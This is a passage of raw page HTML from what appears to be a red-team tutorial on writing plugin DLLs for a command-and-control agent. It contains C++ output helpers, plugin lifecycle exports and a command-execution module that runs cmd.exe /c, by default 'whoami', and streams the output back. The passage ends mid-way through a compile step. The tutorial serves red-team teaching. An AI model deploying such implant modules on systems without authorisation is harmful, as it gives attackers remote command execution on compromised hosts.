text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_418qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">static inline DWORD CStrLenA(const char* s) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; return s ? (DWORD)lstrlenA(s) : 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static void BeaconCout(const char* s, DWORD len = 0) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!s) return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!hOut || hOut == INVALID_HANDLE_VALUE) return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (len == 0) len = (DWORD)lstrlenA(s);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; DWORD n = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; WriteFile(hOut, s, len, &amp;n, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static void BeaconPipeOutput(HANDLE hRead) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; BYTE buf[4096];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; for (;;) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; DWORD got = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if (!ReadFile(hRead, buf, sizeof(buf), &amp;got, nullptr) || got == 0) break;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if (hOut &amp;&amp; hOut != INVALID_HANDLE_VALUE) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD wrote = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile(hOut, buf, got, &amp;wrote, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We need these due to the fact that the loaded DLL will execute its own code internally, but we need it to output any information to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">stdout</code>. In order to achieve this, we need to create wrapper functions around the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">WriteFile</code> API which displays to standard output.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Next, we create <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">CRT-free</code> memory allocation/deallocation helpers which are just wrappers around the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">HeapAlloc</code>/<code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">HeapFree</code> API to allocate the instance of the plugin and destroy it accordingly:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_478qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">extern "C" IPlugin* __stdcall create_plugin() {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (g_plugin) return g_plugin;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Plugin));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!mem) return nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; g_plugin = ::new (mem) Plugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; return g_plugin;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">extern "C" void __stdcall destroy_plugin(IPlugin* p) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!p) return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; p-&gt;~IPlugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; HeapFree(GetProcessHeap(), 0, p);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (p == g_plugin) g_plugin = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Finally, we create the export functions which the agent will receive in order to handle the DLL:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">extern "C" void __stdcall plugin_init(IPlugin* p) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!p) p = create_plugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (p) p-&gt;init();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">extern "C" void __stdcall plugin_exec(TaskApi* task) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!g_plugin) g_plugin = create_plugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (g_plugin) g_plugin-&gt;execute(task);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">extern "C" void __stdcall plugin_cleanup(IPlugin* p) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!p) p = g_plugin;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (p) p-&gt;cleanup();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="example-module-command-execution" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#example-module-command-execution"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_cf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_cf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Example Module: Command Execution</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Here’s a simple module that runs a command via <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">CreateProcess</code> with an inherited pipe, and streams stdout/stderr back through your chosen channel:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">#include &lt;Windows.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;new&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include "IPlugin.h"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">// ---------- run command &amp; pipe to current console ----------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static DWORD RunAndPipeToConsole(const char* cmd, DWORD cmdLen) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // Default to "whoami" if none provided<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; static const char kDefault[] = "whoami";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!cmd || cmdLen == 0) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; cmd &nbsp; &nbsp;= kDefault;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; cmdLen = (DWORD)sizeof(kDefault) - 1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; SECURITY_ATTRIBUTES sa{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; sa.nLength = sizeof(sa);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; sa.bInheritHandle = TRUE;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; HANDLE hRead = nullptr, hWrite = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, 0)) return GetLastError();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // Child inherits only the write end<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; STARTUPINFOA si{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; si.cb = sizeof(si);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; si.dwFlags = STARTF_USESTDHANDLES;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; si.hStdInput &nbsp;= GetStdHandle(STD_INPUT_HANDLE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; si.hStdOutput = hWrite;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; si.hStdError &nbsp;= hWrite;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; PROCESS_INFORMATION pi{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // Build mutable "cmd.exe /c &lt;cmd&gt;"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; static const char kPrefix[] = "C:\\Windows\\System32\\cmd.exe /c ";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const DWORD prefixLen = (DWORD)sizeof(kPrefix) - 1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const DWORD totalLen &nbsp;= prefixLen + cmdLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; char* full = (char*)HeapAlloc(GetProcessHeap(), 0, totalLen + 1);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!full) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle(hRead); CloseHandle(hWrite);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; return ERROR_OUTOFMEMORY;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CopyMemory(full, kPrefix, prefixLen);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CopyMemory(full + prefixLen, cmd, cmdLen);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; full[totalLen] = '\0';<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; BOOL ok = CreateProcessA(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; full, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // mutable buffer<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; nullptr, nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; TRUE, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // inherit write end<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; 0,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; nullptr, nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &amp;si, &amp;pi<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; );<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CloseHandle(hWrite); &nbsp; &nbsp; &nbsp;// parent never writes<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!ok) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; DWORD le = GetLastError();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; HeapFree(GetProcessHeap(), 0, full);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle(hRead);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; return le;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; BeaconPipeOutput(hRead);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; WaitForSingleObject(pi.hProcess, INFINITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; DWORD code = 0; GetExitCodeProcess(pi.hProcess, &amp;code);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CloseHandle(pi.hThread);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CloseHandle(pi.hProcess);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; CloseHandle(hRead);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; HeapFree(GetProcessHeap(), 0, full);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; return code;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Keep this logic <strong class="font-bold">with the module</strong>, not in the shared header—otherwise every plugin drags command-runner baggage along for the ride. Compile this DLL using the following command:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4n8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span 